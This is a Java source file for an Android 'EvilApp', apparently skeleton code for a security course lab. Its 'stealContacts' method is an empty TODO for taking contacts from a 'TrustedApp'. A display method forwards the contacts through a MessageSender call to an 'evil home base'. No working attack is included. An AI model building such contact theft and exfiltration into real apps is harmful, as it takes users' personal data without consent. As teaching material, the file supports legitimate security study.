package com.cs155.evilapp;

import com.cs155.evilapp.R;
import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	setContentView(R.layout.activity_main);
		
	Button button = (Button) findViewById(R.id.btn_steal_contacts);

	OnClickListener listen = new OnClickListener() {
		public void onClick(View v) {
		    // The following line shows how to use the Log library. 
		    Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");
				
		    // TODO: Steal the contacts from TrustedApp
		    stealContacts();
		}
	    };
	
	button.setOnClickListener(listen);		
    }

    /* Use this method to display the contacts in the EvilApp GUI */
    private void showContacts(String contacts) {
	TextView contactView = (TextView) findViewById(R.id.text_view_contacts);
	contactView.setText("Contacts:\n" + contacts);
	
	// Send the contacts to your evil home base
	// Please do not remove this call
	MessageSender m = new MessageSender();
	m.SendMessage(contacts);
    }


    private void stealContacts() {
	// TODO: your implementation here
    }
}
